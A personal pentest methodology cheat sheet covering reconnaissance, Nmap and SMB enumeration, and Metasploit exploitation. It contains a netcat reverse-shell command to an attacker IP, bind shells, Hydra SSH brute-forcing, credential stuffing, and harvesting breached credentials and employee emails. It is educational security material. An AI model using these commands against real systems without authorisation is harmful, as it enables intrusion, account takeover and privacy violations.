# EH Methodology
1. [Reconnaissance](#reconnaissance): Active and Passive
2. [Scanning & Enumeration](#scanning--enumeration): Nmap, Nessus, Nikto
3. [Gaining Access](#gaining-access): Exploitation
4. [Maintaining Access](#maintaining-access)
5. [Covering Tracks](#covering-tracks)

## Reconnaissance
### Passive recon
#### Physical and social
Location information:
- Satellite images
- Drone recon
- Building layout (badge readers, break areas, security, fencing

Job information
- employees (name, job, title, phone, etc.)
- pictures (badge photo, desk photos, computer photos, etc.)

#### Web/Host
- Target Validatidation: WHOIS, nslookup, dnsrecon
- Finding subdomains: Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc.
- Fingerprinting: Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat
- Data breaches: HaveIBeenPwned, Breach-Parse, WeLeakInfo

### Identify target
Bug Bounty program: Bugcrowd
Choose a target and **check the scope**.  ! DO NOT TOUCH THE OUT OF SCOPE DOMAINS !

### Discovering Email Addresses
#### Get email addresses
- Tools: hunter.io, phonebook.cz, clearbit connect (Google app)

Get a list of email addresses of a company with name and job. 
NB: Find if there is a pattern. Ex: {X}{YYYY}@company.com with X being the first letter of firstname, and YYYY the first 4 letters of lastname. 

#### Check if addresses are valid 
Tools: tools.verifyemailaddress.io, email-check.net

### Gathering breached credentials 
Tools: breach-parse, DeHashed (not free)
Find any information email, password, hashed password
For hashed password: go to hashes.org 

### Subdomains
Search all interesting subdomains with the keywords dev, sso, vpn, api, admin, etc.
#### Sublist3r 
Works with Search Engine. Only third level searches like level3.level2.com 
```bash
apt install sublist3r
sublist3r -d [domain]
# use with -t THREAD to speed up depending on CPU power
```
#### crt.sh
Works with certificates. Search on any level like levelN.level3.level2.com 
Enter the following to search subdomains : `%.domain.com`
`%` acts as a wildcard.

#### OWASP Amass
Deep search. Install it via https://github.com/OWASP/Amass

#### httpprobe
Once you get the results, narrow the list down with https://github.com/tomnomnom/httprobe
It returns whether the website is up or down.

### Identifying website technologies
Identifying technologies to determine the version and see if there is any existing vulnerability 
#### builtwith.com
Determines what tech is used in a website (framework, libraries, widget, etc.)

#### wappalyzer (browser add-on)
Gives less information than builtwith.com but it gives you the information right away when you visit any page

#### whatweb (Kali built-in tool)
Not as pretty as above tools but might give more information like technology version that couldn't be retrieve from *builtwith.com* or *wappalyzer*

### Burp Suite
Configure proxy first. Go to browser Preferences > Network Proxy > Manual proxy
Then type *127.0.0.1* as HTTP proxy and port *8080*
OR use *foxy-proxy*
This tool can also be used to identify website technology, but all requests as well. It can read all the requests and edit them.
### Google Fu
https://blog.tryhackme.com/google-fu/
### Social Media
Use Social Media to find any information, pictures, videos that might be vulnerable like work pictures showing a badge etc..
### Active recon
#### Web browser
Tools: Wappalyzer, Foxy Proxy, User-Agent Switcher and Manager
#### Commands
##### ping
```bash
# Basic format
ping HOSTNAME
# Send 10 requests
ping -c 10 HOSTNAME
ping -n 10 HOSTNAME # MS Windows format
# Set packet size to 10 bytes (+ 8 bytes for Header)
ping -s 10 HOSTNAME
```
##### traceroute
```bash
# MacOS and Linux
traceroute HOSTNAME
# MS Windows
tracert HOSTNAME
```
##### telnet
```bash
telnet HOST_IP PORT
GET / HTTP/1.1
Host: whatever
# Type Enter twice to send request
```
##### netcat
Same as above but server side must set up a listener on a specific port. Ports number under 1024 need root privileges
## Scanning & Enumeration
### Scanning
#### Nmap
```bash
# Get all opened port
nmap -T4 -p- <IP address>

# Get more info about found ports
nmap -T4 -p port1,port2 -A <IP address>
```
#### Nikto
```bash
# Get vuln information on host
nikto -h [host]
```
> Currently not working with SSL
#### Nessus
Web app with great interface and great features like scheduled scanning but the app is not free
### Enumeration
#### http (80), https (443)
Tools: dirbuster, BurpSuite
#### smb (139, 445)
Command: nmap
```bash
nmap --script smb-vuln* -p 445 <VICTIM_IP>
```
> Should print if a vulnerability exist with current version of smb

Command: smbclient
```bash
# Try with anonymous auth if you don't have any password
smbclient -L \\\\{IP address}\\
# If results, do 
smbclient \\\\{IP address}\\{repository name}
```
> if the prompt changes and you have `smb: \>` you're in and you can try any SMB command
#### ssh (22) 
#### ftp (21)
```sh
ftp [IP ADDRESS]

# if anonymous login allowed, just type 'anonymous' as Name
Name (10.10.82.90:kali): anonymous
```
If after typing any command you get `229 Entering Extended Passive Mode` and not receiving any response, disable Passive mode by relauching ftp session and:
```sh
229 Entering Extended Passive Mode (|||49316|)
# Relaunch ftp session then type 
ftp> passive
Passive mode: off; fallback to active mode: off.
```
## Gaining Access
### Exploitation Basics
#### Reverse and Bind shell
To perform these attacks, we use the `nc` command (*netcat*). 
In reverse shell, the attacker sets up a listener on a specific port and the target connects his machine to the attacker's like this :
```bash
# Attacker's machine
nc -lvp 4444
```
> l for listening, v for verbose, p for port
```
# Target's machine
nc 192.168.156.1 4444 -e /bin/sh
```
> 192.168.156.1 is attacker's IP address
> e for execute command

In bind shell, the target sets up a listener on a specific port and the attacker connects to the target. But the execution of `/bin/sh` remains in the target's machine.
```bash
# Target's machine
nc -lvp 4444 -e /bin/sh
```
```
# Attacker's machine
nc 192.168.156.2 4444
```
#### Non-staged and Staged payload
##### Non-staged payload
Sends a shellcode all at once. It's larger than staged payload and does not always work. 
You can recognize them in Metasploit like this: `windows/meterpreter_reverse_tcp`
##### Staged payload
Sends a payload in staged. It's less stable. 
You can recognize them in Metasploit like this: `windows/meterpreter/reverse_tcp`
Notice the `/`replacing the `_` in the non-staged payload.
### Gaining root with Metasploit
First, search an exploit using the info you gathered with enumeration. Ex: smb
```bash
# In Kali
searchsploit samba 2.2
```
You'll get a list of exploits that can be use to attack a machine. Select one exploit and run `msfconsole`: 
```bash
msf5 > search {exploit_name}
```
You'll get a list of module representing different OS. Select one that corresponds to victim's machine. 

```bash
msf5 > use {module_number}
# OR
msf5 > use {module_name}
```
At this point, the prompt should be different. You should see `msf5 {module_name} >`. 
```bash
msf5 > options 
msf5 > set RHOSTS # or RHOST 
msf5 > set RPORT
msf5 > set LHOST
msf5 > set LPORT 
msf5 > show targets # depending on the number of targets, you might need to select one manually
msf5 > exploit # or run
```
If it failed:
```bash
msf5 > options # should show Payload options after one failed attempt
msf5 > set payload {OS}/{arch}/{payload} # Hit tab to autocomplete. Sometimes non-staged payloads work best

```
### Gaining root manually
Using information found in Enumeration step, find the appropriate exploit on github or whatever, read the instruction and you should get root access. 
### Brute Force attack
Example: Kali Linux, SSH attack
```bash
# With Hydra
hydra -l root -P /usr/wordlists/metasploit/<pass_file> ssh://<IP>:22 -t 4 -V

# With Metasploit
msfconsole
msf5 > search ssh # search for ssh login exploits
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > options
# set user, pass file, target IP, verbose, threads etc.
```
### Credentials stuffing and password spraying
#### Credential stuffing
Use a list of login:password to gain access. Sometimes servers get attacked and credentials are stolen. It is quite easy to get stolen credentials in web/darkweb. Usually this attack expect to find a user that has a bad habit of using the same password everywhere. 
`Burpsuite > Intruder > Attack type: Pitchfork`
#### Password spraying
Use one password and a login list to bruteforce the login. Usually used with default password on application.
`Burpsuite > Intruder > Attack type: Sniper`
> Be careful during pentests. You need to know password policy or else you could lock out users with too many attempts on both attacks
## Maintaining Access
## Covering Tracks

Read:
Darknet diaries
<!--stackedit_data:
eyJoaXN0b3J5IjpbODEyMzc4NzI0LDE2Mjc5Mjg2MywtOTE2MT
I1OTUxLDkyNzAyNzE1OCwxNTExNzA2MDIzLC03Nzc0MjgxMDUs
NDQ5MTU4NDcwLDY1Njk1ODMxMCwtMTg2OTI5MTI4MSwtOTMzNz
kyNjM5LC0xMDM5MTQyMzMwLC0zODk4NzE2NCwxNzQ3NDEwMDk5
LDIwMzQ4NjQyNzEsMTY3NzQ1MjE3MCwxODE4MTc2MjE5LC0xMD
k3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5MjI1NCwtMzYzMTYy
MDA5XX0=
-->